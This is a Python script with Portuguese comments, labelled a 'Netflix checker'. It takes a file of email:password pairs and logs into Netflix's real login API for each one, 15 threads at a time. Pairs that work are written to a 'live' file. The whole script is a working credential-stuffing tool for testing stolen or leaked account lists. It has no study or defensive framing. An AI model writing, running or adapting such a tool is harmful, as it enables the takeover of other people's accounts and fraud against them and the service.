import requests
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import os

init(autoreset=True)

# Configurações
MAX_THREADS = 15
TIMEOUT = 10
LIVE_FILE = "live.txt"
DIE_FILE = "die.txt"
ERROR_FILE = "errors.txt"
LOGINS_FILE = "logins.txt"

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def show_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      NETFLIX CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(f"{Fore.GREEN}✅ LIVE: {stats['live']}")
    print(f"{Fore.RED}❌ DIE: {stats['die']}")
    print(f"{Fore.YELLOW}⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + "══════════════════════════════════")
    print(f"{Fore.WHITE}TOTAL: {stats['total']}")
    print(f"TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def save_result(filename, content):
    try:
        with open(filename, 'a') as f:
            f.write(content + '\n')
    except:
        pass

def check_account(email, password):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        # Primeira requisição para pegar authURL e ESN
        response = session.get("https://www.netflix.com/login", timeout=TIMEOUT)
        auth_url = response.text.split(',"authURL":"')[1].split('",')[0]
        esn = response.text.split('"esn":"')[1].split('"')[0]

        # Dados para a requisição de login
        post_data = {
            "authURL": urllib.parse.quote(urllib.parse.unquote(auth_url)),
            "esn": esn,
            "param": '{"flow":"signupSimplicity","mode":"passwordOnly","action":"loginAction","fields":{"password":{"value":"' + urllib.parse.quote(password) + '"},"email":{"value":"' + urllib.parse.quote(email) + '"}}}'
        }

        # Tentativa de login
        response = session.post(
            "https://www.netflix.com/api/aui/pathEvaluator/web/%5E2.0.0",
            data=post_data,
            timeout=TIMEOUT
        )

        if "CURRENT_MEMBER" in response.text:
            stats['live'] += 1
            save_result(LIVE_FILE, f"{email}:{password}")
            return f"{Fore.GREEN}[+] LIVE | {email}:{password}"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, f"{email}:{password}")
            return f"{Fore.RED}[-] DIE | {email}:{password}"

    except Exception as e:
        stats['error'] += 1
        save_result(ERROR_FILE, f"{email}:{password} | {str(e)}")
        return f"{Fore.YELLOW}[!] ERROR | {email}:{password} | {str(e)[:50]}"

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line.strip()]

    if not accounts:
        print(Fore.RED + "Nenhuma conta encontrada no arquivo!")
        return

    stats['total'] = len(accounts)
    show_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            email, password = acc[0], acc[1]
            futures.append(executor.submit(check_account, email, password))

        for future in as_completed(futures):
            print(future.result())
            show_panel()

    print(Fore.GREEN + "\nVerificação concluída! Resultados salvos em:")
    print(Fore.GREEN + f"- {LIVE_FILE} (contas válidas)")
    print(Fore.RED + f"- {DIE_FILE} (contas inválidas)")
    print(Fore.YELLOW + f"- {ERROR_FILE} (erros encontrados)")

if __name__ == "__main__":
    main()